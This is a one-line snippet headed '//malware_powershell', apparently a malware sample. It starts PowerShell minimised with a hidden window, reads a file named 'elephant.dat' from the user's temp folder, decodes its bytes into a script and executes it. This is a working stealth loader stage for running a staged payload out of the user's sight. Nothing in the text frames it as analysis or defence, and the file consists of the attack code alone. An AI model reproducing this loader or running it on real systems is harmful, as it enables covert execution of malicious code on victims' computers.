//malware_powershell
start /min C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden "$stringPath=$env:temp+'\'+'elephant.dat';$stringByte = Get-Content -path $stringPath -encoding byte;$string = [System.Text.Encoding]::UTF8.GetString($stringByte);$scriptBlock = [scriptblock]::Create($string);Invoke-Command $scriptBlock;"
